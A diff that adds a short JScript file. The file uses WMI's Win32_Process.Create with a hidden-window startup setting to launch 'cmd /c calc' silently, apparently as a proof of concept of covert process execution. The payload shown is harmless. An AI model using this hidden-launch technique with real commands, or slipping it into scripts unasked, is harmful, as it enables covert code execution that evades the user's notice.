@@ -1,0 +1,4 @@
+var w = GetObject("winmgmts:\\\\.\\root\\cimv2");
+var s = w.Get("Win32_ProcessStartup"); s.ShowWindow = 0;
+var p = GetObject("winmgmts:Win32_Process"); p.Create("cmd /c calc", null, s, pid); WScript.Echo("");
+
